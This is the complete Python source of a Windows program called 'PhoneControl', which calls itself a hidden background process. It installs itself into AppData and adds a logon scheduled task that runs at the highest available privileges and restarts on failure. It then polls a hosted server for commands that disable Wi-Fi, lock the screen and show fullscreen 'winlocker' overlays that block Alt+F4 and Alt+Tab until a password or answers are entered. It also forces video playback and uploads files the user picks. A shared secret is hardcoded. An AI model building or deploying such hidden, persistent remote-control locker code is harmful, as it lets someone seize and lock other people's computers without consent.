"""
PhoneControl — Windows client
Polls the server and executes commands locally.
Runs as a hidden background process (no window, no tray).
"""

import sys
import os
import threading
import time
import uuid
import json
import logging
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import mimetypes
import tkinter as tk
from tkinter import filedialog
import ctypes
import ctypes.wintypes
from pathlib import Path

# ─── Config ──────────────────────────────────────────────────────────────────

SERVER_URL    = os.environ.get("PC_SERVER_URL",    "https://phonecontrol-1123.onrender.com")
DEVICE_SECRET = os.environ.get("PC_DEVICE_SECRET", "mysecret42")
POLL_INTERVAL_IDLE   = 30   # seconds when inactive
POLL_INTERVAL_ACTIVE = 10   # seconds when active

# ─── Logging (to file next to exe) ───────────────────────────────────────────

BASE_DIR = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent
LOG_FILE  = BASE_DIR / "phonecontrol.log"

logging.basicConfig(
    filename=str(LOG_FILE),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("pc")

# ─── Device ID (persistent) ──────────────────────────────────────────────────

PREFS_FILE = BASE_DIR / "phonecontrol_prefs.json"

def get_device_id() -> str:
    prefs = {}
    if PREFS_FILE.exists():
        try:
            prefs = json.loads(PREFS_FILE.read_text())
        except Exception:
            pass
    if "device_id" not in prefs:
        prefs["device_id"] = uuid.uuid4().hex[:16]
        PREFS_FILE.write_text(json.dumps(prefs))
    return prefs["device_id"]

DEVICE_ID = get_device_id()

# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _headers(extra: dict = None) -> dict:
    h = {
        "X-Device-Secret": DEVICE_SECRET,
        "X-Device-Id":     DEVICE_ID,
        "X-Device-Model":  "Windows PC",
    }
    if extra:
        h.update(extra)
    return h

def http_get(path: str) -> dict:
    url = SERVER_URL + path
    req = urllib.request.Request(url, headers=_headers())
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def http_post_json(path: str, data: dict) -> dict:
    url     = SERVER_URL + path
    payload = json.dumps(data).encode()
    req     = urllib.request.Request(
        url, data=payload,
        headers={**_headers(), "Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def http_post_multipart(path: str, filepath: str, chat_id: str, caption: str = "") -> dict:
    """Upload a file to /upload via multipart/form-data."""
    import email.generator, io, email.mime.multipart, email.mime.base
    boundary = uuid.uuid4().hex
    filename  = os.path.basename(filepath)
    mime_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"

    with open(filepath, "rb") as f:
        file_data = f.read()

    body  = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {mime_type}\r\n\r\n"
    ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()

    url = SERVER_URL + path
    req = urllib.request.Request(
        url, data=body,
        headers={
            **_headers({
                "X-Chat-Id": chat_id,
                "X-Caption":  urllib.parse.quote(caption or filename),
            }),
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=120) as r:
        return json.loads(r.read())

def send_text_reply(chat_id: str, text: str):
    try:
        http_post_json("/text_reply", {
            "chat_id":   chat_id,
            "text":      text,
            "device_id": DEVICE_ID,
        })
    except Exception as e:
        log.error(f"send_text_reply: {e}")

# ─── Wi-Fi control ────────────────────────────────────────────────────────────

def wifi_disable():
    """Disable the first Wi-Fi adapter found via netsh (requires admin)."""
    try:
        result = subprocess.run(
            ["netsh", "interface", "show", "interface"],
            capture_output=True, text=True, timeout=10
        )
        adapter = None
        for line in result.stdout.splitlines():
            if "Wi-Fi" in line or "Wireless" in line or "WLAN" in line or "Беспроводная" in line:
                parts = line.split()
                adapter = parts[-1] if parts else None
                break
        if not adapter:
            adapter = "Wi-Fi"  # fallback
        subprocess.run(
            ["netsh", "interface", "set", "interface", adapter, "disable"],
            timeout=10
        )
        log.info(f"Wi-Fi disabled ({adapter})")
        return adapter
    except Exception as e:
        log.error(f"wifi_disable: {e}")
        return "Wi-Fi"

def wifi_enable(adapter: str = "Wi-Fi"):
    try:
        subprocess.run(
            ["netsh", "interface", "set", "interface", adapter, "enable"],
            timeout=10
        )
        log.info(f"Wi-Fi enabled ({adapter})")
    except Exception as e:
        log.error(f"wifi_enable: {e}")

# ─── Lock screen ──────────────────────────────────────────────────────────────

def lock_screen():
    try:
        ctypes.windll.user32.LockWorkStation()
    except Exception as e:
        log.error(f"lock_screen: {e}")

# ─── Volume control ───────────────────────────────────────────────────────────

def set_volume(level: int):
    """level 0-10 → 0.0-1.0 via pycaw or nircmd fallback."""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        scalar = max(0.0, min(1.0, level / 10.0))
        volume.SetMasterVolumeLevelScalar(scalar, None)
        log.info(f"Volume set to {level}/10")
    except Exception as e:
        log.warning(f"pycaw failed ({e}), trying nircmd")
        try:
            # nircmd.exe if available
            vol_raw = int(level / 10 * 65535)
            subprocess.run(["nircmd.exe", "setsysvolume", str(vol_raw)], timeout=5)
        except Exception as e2:
            log.error(f"set_volume fallback failed: {e2}")

# ─── Winlocker base ───────────────────────────────────────────────────────────

def make_fullscreen_root(bg: str = "#1a1a2e") -> tk.Tk:
    """Create a topmost fullscreen window that blocks Alt+F4 and other keys."""
    root = tk.Tk()
    root.configure(bg=bg)
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    # Block Alt+F4
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    # Block Alt+Tab, Win key via low-level — best effort
    root.bind("<Alt-F4>",    lambda e: "break")
    root.bind("<Alt-Tab>",   lambda e: "break")
    root.bind("<Escape>",    lambda e: "break")
    root.focus_force()
    return root

def keep_on_top(root: tk.Tk, stop_event: threading.Event):
    """Thread: keep window on top every 500ms until stop_event is set."""
    while not stop_event.is_set():
        try:
            root.attributes("-topmost", True)
            root.lift()
            root.focus_force()
        except Exception:
            break
        time.sleep(0.5)

# ─── MSG overlay ─────────────────────────────────────────────────────────────

def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
                          survey: list, chat_id: str):
    """
    plain  → text + OK button (closes on OK)
    reply  → text + input + Send (winlocker until sent)
    survey → questions one by one + Send (winlocker until done)
    """
    stop_event = threading.Event()
    answers    = []
    q_index    = [0]

    root = make_fullscreen_root("#1a1a2e")
    threading.Thread(target=keep_on_top, args=(root, stop_event), daemon=True).start()

    # ── Layout ────────────────────────────────────────────────────────────────
    outer = tk.Frame(root, bg="#1a1a2e")
    outer.place(relx=0.5, rely=0.5, anchor="center")

    card = tk.Frame(outer, bg="#16213e", padx=40, pady=40,
                    relief="flat", bd=0)
    card.pack()

    msg_var = tk.StringVar(value=text)
    msg_lbl = tk.Label(card, textvariable=msg_var, bg="#16213e", fg="white",
                       font=("Segoe UI", 18), wraplength=700, justify="center")
    msg_lbl.pack(pady=(0, 20))

    input_frame = tk.Frame(card, bg="#16213e")
    entry       = tk.Entry(input_frame, font=("Segoe UI", 14), width=40,
                           bg="#0f3460", fg="white", insertbackground="white",
                           relief="flat", bd=8)

    prompt_lbl = tk.Label(card, text="", bg="#16213e", fg="#a0a0c0",
                           font=("Segoe UI", 12))

    btn_text = tk.StringVar(value="ОК")
    btn = tk.Button(card, textvariable=btn_text, font=("Segoe UI", 14, "bold"),
                    bg="#e94560", fg="white", activebackground="#c73652",
                    activeforeground="white", relief="flat", padx=30, pady=12,
                    cursor="hand2")
    btn.pack(pady=(10, 0))

    def do_plain_ok():
        stop_event.set()
        root.destroy()

    def do_send():
        answer = entry.get().strip()
        if not answer:
            return
        answers.append(answer)
        entry.delete(0, tk.END)

        if fb_mode == "survey" and q_index[0] < len(survey) - 1:
            q_index[0] += 1
            msg_var.set(survey[q_index[0]])
            prompt_lbl.config(text=f"Вопрос {q_index[0]+1}/{len(survey)}")
        else:
            # Send all answers
            result_text = "\n".join(
                f"Q: {survey[i]}\nA: {answers[i]}"
                for i in range(len(answers))
            ) if fb_mode == "survey" else answers[0]
            threading.Thread(
                target=send_text_reply, args=(chat_id, result_text), daemon=True
            ).start()
            stop_event.set()
            root.destroy()

    # ── Configure by mode ─────────────────────────────────────────────────────
    if fb_mode == "plain":
        btn.config(command=do_plain_ok)

    elif fb_mode == "reply":
        prompt_lbl.config(text=reply_prompt)
        prompt_lbl.pack(pady=(0, 6))
        input_frame.pack(pady=(0, 10))
        entry.pack()
        entry.focus()
        btn_text.set("Отправить")
        btn.config(command=do_send)
        entry.bind("<Return>", lambda e: do_send())

    elif fb_mode == "survey":
        if survey:
            msg_var.set(survey[0])
            prompt_lbl.config(text=f"Вопрос 1/{len(survey)}")
            prompt_lbl.pack(pady=(0, 6))
            input_frame.pack(pady=(0, 10))
            entry.pack()
            entry.focus()
            btn_text.set("Далее")
            btn.config(command=do_send)
            entry.bind("<Return>", lambda e: do_send())
        else:
            btn.config(command=do_plain_ok)

    root.mainloop()

# ─── Video overlay ────────────────────────────────────────────────────────────

# Global reference so /unbanvideo can close it
_video_window: tk.Tk = None
_video_stop:   threading.Event = threading.Event()

def show_video_overlay(video_path: str, lock: bool, duration: int,
                        fb_mode: str, reply_prompt: str, survey: list,
                        chat_id: str):
    global _video_window, _video_stop

    _video_stop = threading.Event()
    stop_event  = _video_stop

    try:
        import vlc  # type: ignore
        has_vlc = True
    except ImportError:
        has_vlc = False

    root = make_fullscreen_root("#000000")
    _video_window = root
    threading.Thread(target=keep_on_top, args=(root, stop_event), daemon=True).start()

    answers  = []
    q_index  = [0]
    unlocked = [not lock]   # if lock=False, already unlocked from start

    # ── Bottom UI (shown after required duration or always if not locked) ─────
    bottom = tk.Frame(root, bg="#111111")
    bottom.pack(side="bottom", fill="x", pady=20)

    status_lbl = tk.Label(bottom, text="", bg="#111111", fg="#888",
                           font=("Segoe UI", 12))
    status_lbl.pack()

    input_frame = tk.Frame(bottom, bg="#111111")
    entry       = tk.Entry(input_frame, font=("Segoe UI", 13), width=50,
                           bg="#222", fg="white", insertbackground="white",
                           relief="flat", bd=8)
    send_btn    = tk.Button(input_frame, text="Отправить",
                            font=("Segoe UI", 12, "bold"),
                            bg="#e94560", fg="white", relief="flat",
                            padx=20, pady=8, cursor="hand2")
    close_btn   = tk.Button(bottom, text="✕  Закрыть",
                            font=("Segoe UI", 12),
                            bg="#333", fg="white", relief="flat",
                            padx=20, pady=8, cursor="hand2")

    def do_close():
        stop_event.set()
        _video_window = None
        root.destroy()

    def do_send():
        answer = entry.get().strip()
        if not answer:
            return
        answers.append(answer)
        entry.delete(0, tk.END)
        if fb_mode == "survey" and q_index[0] < len(survey) - 1:
            q_index[0] += 1
            status_lbl.config(text=f"{survey[q_index[0]]}  ({q_index[0]+1}/{len(survey)})")
        else:
            result = "\n".join(
                f"Q: {survey[i]}\nA: {answers[i]}" for i in range(len(answers))
            ) if fb_mode == "survey" else answers[0]
            threading.Thread(
                target=send_text_reply, args=(chat_id, result), daemon=True
            ).start()
            do_close()

    send_btn.config(command=do_send)
    close_btn.config(command=do_close)

    def unlock_ui():
        unlocked[0] = True
        status_lbl.config(text="")
        if fb_mode == "reply":
            status_lbl.config(text=reply_prompt)
            entry.pack(side="left", padx=(0, 10))
            send_btn.pack(side="left")
            input_frame.pack(pady=(0, 10))
            entry.focus()
        elif fb_mode == "survey" and survey:
            status_lbl.config(text=f"{survey[0]}  (1/{len(survey)})")
            entry.pack(side="left", padx=(0, 10))
            send_btn.pack(side="left")
            input_frame.pack(pady=(0, 10))
            entry.focus()
        else:
            close_btn.pack()

    # ── Video frame ───────────────────────────────────────────────────────────
    if has_vlc:
        video_frame = tk.Frame(root, bg="black")
        video_frame.pack(fill="both", expand=True)
        root.update()

        instance = vlc.Instance()
        player   = instance.media_player_new()
        media    = instance.media_new(video_path)
        player.set_media(media)
        player.set_hwnd(video_frame.winfo_id())
        player.play()
    else:
        # Fallback: open with default player
        subprocess.Popen(["start", "", video_path], shell=True)
        tk.Label(root, text="▶  Воспроизведение...", bg="black", fg="white",
                 font=("Segoe UI", 22)).pack(expand=True)

    # ── Duration countdown before unlock ─────────────────────────────────────
    if duration > 0:
        def countdown():
            for remaining in range(duration, 0, -1):
                if stop_event.is_set():
                    return
                try:
                    root.after(0, lambda r=remaining: status_lbl.config(
                        text=f"⏱ Осталось: {r} сек"))
                except Exception:
                    return
                time.sleep(1)
            if not stop_event.is_set():
                root.after(0, unlock_ui)
        threading.Thread(target=countdown, daemon=True).start()
    else:
        if not lock:
            root.after(500, unlock_ui)
        # if lock=True and duration=0 → stays locked until /unbanvideo

    root.mainloop()

def unban_video():
    global _video_window
    if _video_window:
        try:
            _video_stop.set()
            _video_window.after(0, _video_window.destroy)
            _video_window = None
        except Exception as e:
            log.error(f"unban_video: {e}")

# ─── File picker ─────────────────────────────────────────────────────────────

def open_file_picker(chat_id: str):
    """Open file dialog and upload selected file to server."""
    def _pick():
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        filepath = filedialog.askopenfilename(
            title="Выбери файл для отправки",
            filetypes=[
                ("Все файлы", "*.*"),
                ("Изображения", "*.jpg *.jpeg *.png *.gif *.webp *.bmp"),
                ("Видео",       "*.mp4 *.mov *.avi *.mkv *.3gp"),
            ]
        )
        root.destroy()
        if filepath:
            try:
                http_post_multipart("/upload", filepath, chat_id)
                log.info(f"File uploaded: {filepath}")
            except Exception as e:
                log.error(f"File upload failed: {e}")
    threading.Thread(target=_pick, daemon=True).start()

# ─── Ban state ────────────────────────────────────────────────────────────────

class BanState:
    def __init__(self):
        self.active      = False
        self.adapter     = "Wi-Fi"
        self.password    = None   # None = no password required
        self.timer       = None   # threading.Timer for auto-unban
        self._lock       = threading.Lock()
        # Winlocker window for password-ban
        self._pw_root: tk.Tk = None
        self._pw_stop        = threading.Event()

    def ban(self, password: str | None):
        with self._lock:
            if self.active:
                return
            self.active   = True
            self.password = password
            self.adapter  = wifi_disable()

            if password:
                # Start auto-unban timer (5 min) but also show password screen
                self.timer = threading.Timer(300, self._auto_unban)
                self.timer.start()
                threading.Thread(target=self._show_pw_screen, daemon=True).start()
            else:
                # No password — just Wi-Fi off, auto-unban in 5 min
                self.timer = threading.Timer(300, self._auto_unban)
                self.timer.start()

    def unban(self):
        with self._lock:
            if not self.active:
                return
            self.active   = False
            self.password = None
            if self.timer:
                self.timer.cancel()
                self.timer = None
            wifi_enable(self.adapter)
            self._close_pw_screen()

    def _auto_unban(self):
        log.info("Auto-unban triggered")
        self.unban()

    def try_password(self, entered: str) -> bool:
        if self.password and entered == self.password:
            self.unban()
            return True
        return False

    def _show_pw_screen(self):
        self._pw_stop = threading.Event()
        root = make_fullscreen_root("#1a1a2e")
        self._pw_root = root
        threading.Thread(
            target=keep_on_top, args=(root, self._pw_stop), daemon=True
        ).start()

        card = tk.Frame(root, bg="#16213e", padx=50, pady=50)
        card.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(card, text="🔒  Интернет заблокирован", bg="#16213e",
                 fg="white", font=("Segoe UI", 20, "bold")).pack(pady=(0, 20))
        tk.Label(card, text="Введи пароль для разблокировки:",
                 bg="#16213e", fg="#a0a0c0", font=("Segoe UI", 13)).pack(pady=(0, 10))

        entry = tk.Entry(card, font=("Segoe UI", 14), width=30,
                         bg="#0f3460", fg="white", insertbackground="white",
                         relief="flat", bd=8, show="•")
        entry.pack(pady=(0, 10))
        entry.focus()

        err_lbl = tk.Label(card, text="", bg="#16213e", fg="#e94560",
                           font=("Segoe UI", 12))
        err_lbl.pack()

        def attempt():
            if self.try_password(entry.get()):
                pass  # unban() already closes screen
            else:
                entry.delete(0, tk.END)
                err_lbl.config(text="❌ Неверный пароль")

        btn = tk.Button(card, text="Разблокировать",
                        font=("Segoe UI", 13, "bold"),
                        bg="#e94560", fg="white", relief="flat",
                        padx=25, pady=10, cursor="hand2", command=attempt)
        btn.pack(pady=(10, 0))
        entry.bind("<Return>", lambda e: attempt())

        root.mainloop()

    def _close_pw_screen(self):
        if self._pw_root:
            try:
                self._pw_stop.set()
                self._pw_root.after(0, self._pw_root.destroy)
                self._pw_root = None
            except Exception:
                pass


ban_state = BanState()

# ─── Video cache ──────────────────────────────────────────────────────────────

CACHE_DIR = BASE_DIR / "video_cache"
CACHE_DIR.mkdir(exist_ok=True)

BUILTIN_VIDEO_DIR = BASE_DIR / "assets"

def cache_filename(url: str) -> Path:
    return CACHE_DIR / (uuid.uuid5(uuid.NAMESPACE_URL, url).hex + ".mp4")

def prefetch_video(url: str):
    dest = cache_filename(url)
    if dest.exists() and dest.stat().st_size > 0:
        return
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=60) as r, open(dest, "wb") as f:
            while chunk := r.read(8192):
                f.write(chunk)
        log.info(f"Prefetched: {url} → {dest}")
    except Exception as e:
        log.error(f"prefetch_video: {e}")

def delete_video_cache(url: str):
    dest = cache_filename(url)
    if dest.exists():
        dest.unlink()
        log.info(f"Deleted cache: {url}")

# ─── Command handler ─────────────────────────────────────────────────────────

def handle_command(cmd: dict):
    name     = cmd.get("cmd", "")
    chat_id  = cmd.get("_chat_id", "")
    lock     = cmd.get("lock", False)
    duration = cmd.get("duration", 0)
    fb_mode  = cmd.get("fb_mode", "plain")
    rp       = cmd.get("reply_prompt", "✏️ Напиши ответ:")
    survey   = cmd.get("survey", [])

    log.info(f"Command: {name}")

    if name == "shutdown":
        lock_screen()

    elif name == "ban":
        password = cmd.get("password") or None
        ban_state.ban(password)

    elif name == "unban":
        ban_state.unban()

    elif name == "sound":
        set_volume(cmd.get("level", 5))

    elif name == "show_message":
        text = cmd.get("text", "")
        threading.Thread(
            target=show_message_overlay,
            args=(text, fb_mode, rp, survey, chat_id),
            daemon=True
        ).start()

    elif name == "video":
        num  = cmd.get("num", 1)
        path = str(BUILTIN_VIDEO_DIR / f"video{num}.mp4")
        if not os.path.exists(path):
            log.warning(f"Built-in video not found: {path}")
            return
        threading.Thread(
            target=show_video_overlay,
            args=(path, lock, duration, fb_mode, rp, survey, chat_id),
            daemon=True
        ).start()

    elif name == "play_raw":
        url  = cmd.get("url", "")
        path = cache_filename(url)
        if not path.exists():
            # Download synchronously then play
            prefetch_video(url)
        if path.exists():
            threading.Thread(
                target=show_video_overlay,
                args=(str(path), lock, duration, fb_mode, rp, survey, chat_id),
                daemon=True
            ).start()
        else:
            log.error(f"play_raw: could not download {url}")

    elif name == "prefetch":
        url = cmd.get("url", "")
        threading.Thread(target=prefetch_video, args=(url,), daemon=True).start()

    elif name == "delete_video":
        delete_video_cache(cmd.get("url", ""))

    elif name == "unban_video":
        unban_video()

    elif name in ("open_gallery", "open_camera"):
        # Both → open file manager / file picker
        open_file_picker(chat_id)

    else:
        log.warning(f"Unknown command: {name}")

# ─── Main poll loop ───────────────────────────────────────────────────────────

def poll_loop():
    consecutive_errors = 0
    last_instance_id   = ""
    active             = False

    log.info(f"PhoneControl Windows client started. Device ID: {DEVICE_ID}")
    log.info(f"Server: {SERVER_URL}")

    while True:
        try:
            data = http_get("/poll")
            consecutive_errors = 0

            active = data.get("active", False)

            instance_id = data.get("instance_id", "")
            if instance_id and instance_id != last_instance_id:
                log.info(f"Server instance changed: {instance_id}")
                last_instance_id = instance_id

            cmd = data.get("command")
            if cmd:
                threading.Thread(
                    target=handle_command, args=(cmd,), daemon=True
                ).start()

        except Exception as e:
            consecutive_errors += 1
            log.error(f"Poll error #{consecutive_errors}: {e}")
            if consecutive_errors >= 10:
                log.warning("Too many errors, backing off 60s")
                time.sleep(60)
                consecutive_errors = 0
                continue

        time.sleep(POLL_INTERVAL_ACTIVE if active else POLL_INTERVAL_IDLE)


# ─── Self-install ─────────────────────────────────────────────────────────────

INSTALL_DIR  = Path(os.environ["APPDATA"]) / "PhoneControl"
INSTALL_EXE  = INSTALL_DIR / "phonecontrol.exe"
TASK_NAME    = "PhoneControlAgent"
UNINSTALL_CMD = f'schtasks /delete /tn "{TASK_NAME}" /f && rmdir /s /q "{INSTALL_DIR}"'

def is_installed() -> bool:
    """Already running from install location."""
    if not getattr(sys, "frozen", False):
        return True  # running as .py in dev — skip install
    return Path(sys.executable).resolve() == INSTALL_EXE.resolve()

def self_install():
    """Copy exe to AppData, register scheduled task, launch it, exit."""
    INSTALL_DIR.mkdir(parents=True, exist_ok=True)

    src = Path(sys.executable)
    # Copy assets folder too
    src_assets = src.parent / "assets"
    dst_assets = INSTALL_DIR / "assets"

    import shutil
    shutil.copy2(src, INSTALL_EXE)
    if src_assets.exists():
        if dst_assets.exists():
            shutil.rmtree(dst_assets)
        shutil.copytree(src_assets, dst_assets)

    log.info(f"Copied to {INSTALL_EXE}")

    # Register scheduled task — runs at logon, restarts on failure
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions>
    <Exec>
      <Command>{INSTALL_EXE}</Command>
    </Exec>
  </Actions>
</Task>"""

    xml_path = INSTALL_DIR / "task.xml"
    xml_path.write_text(xml, encoding="utf-16")

    subprocess.run(
        ["schtasks", "/create", "/tn", TASK_NAME,
         "/xml", str(xml_path), "/f"],
        check=True, timeout=15
    )
    xml_path.unlink()
    log.info("Scheduled task registered")

    # Launch installed exe and exit current process
    subprocess.Popen([str(INSTALL_EXE)],
                     creationflags=0x00000008)  # DETACHED_PROCESS
    log.info("Launched installed exe, exiting installer")
    sys.exit(0)


def print_uninstall_hint():
    """Write uninstall command to a visible .bat so user can find it easily."""
    bat = INSTALL_DIR / "uninstall.bat"
    bat.write_text(
        f"@echo off\n"
        f"schtasks /delete /tn \"{TASK_NAME}\" /f\n"
        f"timeout /t 1 >nul\n"
        f"rmdir /s /q \"{INSTALL_DIR}\"\n",
        encoding="utf-8"
    )
    log.info(f"Uninstall: {bat}")


if __name__ == "__main__":
    # Hide console
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )

    if not is_installed():
        # First run — install, launch, exit
        self_install()
    else:
        # Already installed — write uninstall hint and start working
        print_uninstall_hint()
        poll_loop()
